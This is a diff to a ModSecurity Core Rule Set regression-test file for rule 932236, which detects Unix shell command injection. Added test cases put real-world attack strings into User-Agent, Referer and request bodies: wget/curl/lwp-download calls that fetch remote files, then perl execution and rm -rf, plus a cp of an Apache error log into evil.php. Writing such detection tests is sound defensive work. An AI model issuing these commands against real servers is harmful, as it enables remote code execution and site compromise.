@@ -1,6 +1,6 @@
 ---
 meta:
-  author: "Franziska Bühler"
+  author: "Franziska Bühler, Max Leske"
   description: Unix shell RCE wordlist for more than 3 characters
   enabled: true
   name: 932236.yaml
@@ -35,5 +35,159 @@ tests:
             port: 80
             uri: /
             version: HTTP/1.0
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-3
+    desc: System Command Injection (932236) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip,deflate
+              Accept-Language: en-us,en;q=0.5
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              User-Agent: system('echo cd /tmp;wget http://turbatu.altervista.org/apache_32.png -O p2.txt;curl -O http://turbatu.altervista.org/apache_32.png; mv apache_32.png p.txt;lyxn -DUMP http://turbatu.altervista.org/apache_32.png >p3.txt;perl p.txt; perl p2.txt;perl p3.txt;rm -rf
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-4
+    desc: System Command Injection (932236) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip,deflate
+              Accept-Language: en-us,en;q=0.5
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              User-Agent: http://ricky.ilmerlodellarocca.com/upload.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg; appa.jpg;perl appa.jpg;rm -rf appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;mv ca.php ca.php;chmod 755 ca.php
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-5
+    desc: True Positive Fix Test 1 ISO-8859-2, ISO-8859-3, ISO-8859-4, ISO-8859-5, ISO-8859-6, ISO-8859-7, ISO-8859-8, ISO-8859-10, ISO-8859-14, ISO-8859-15 are affected because the chars are encoded as decimal html %26%238222%3B and %26%238221%3B entities
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: Something true positive &#8222;The Title&#8221;. After space or new line more characters
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932236"
+  - test_title: 932236-6
+    desc: System Command Injection (932236) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip,deflate
+              Accept-Language: en-us,en;q=0.5
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Referer: system('echo cd /tmp;wget http://turbatu.altervista.org/apache_32.png -O p2.txt;curl -O http://turbatu.altervista.org/apache_32.png; mv apache_32.png p.txt;lyxn -DUMP http://turbatu.altervista.org/apache_32.png >p3.txt;perl p.txt; perl p2.txt;perl p3.txt;rm -rf
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-7
+    desc: System Command Injection (932236) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip,deflate
+              Accept-Language: en-us,en;q=0.5
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Referer: http://ricky.ilmerlodellarocca.com/upload.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg; appa.jpg;perl appa.jpg;rm -rf appa.jpg;wget http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;curl -O http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;lwp-download http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt ca.php;mv ca.php ca.php;chmod 755 ca.php
+            method: GET
+            port: 80
+            uri: /get
+            version: HTTP/1.1
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-8
+    desc: True Positive Fix Test 1 ISO-8859-2, ISO-8859-3, ISO-8859-4, ISO-8859-5, ISO-8859-6, ISO-8859-7, ISO-8859-8, ISO-8859-10, ISO-8859-14, ISO-8859-15 are affected because the chars are encoded as decimal html %26%238222%3B and %26%238221%3B entities
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+              Referer: Something true positive &#8222;The Title&#8221;. After space or new line more characters
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate, br
+              Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
+              Content-Type: application/x-www-form-urlencoded
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.1
+          output:
+            no_log_contains: id "932236"
+  - test_title: 932236-9
+    desc: "False negative report"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: ;cp /var/log/apache2/error.log evil.php
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.0
+          output:
+            log_contains: id "932236"
+  - test_title: 932236-10
+    desc: "False negative report"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+              Host: localhost
+              User-Agent: OWASP ModSecurity Core Rule Set
+            method: POST
+            port: 80
+            uri: /post
+            version: HTTP/1.0
+            data: ;cp /var/log/apache2/error.log evil.php
           output:
             log_contains: id "932236"
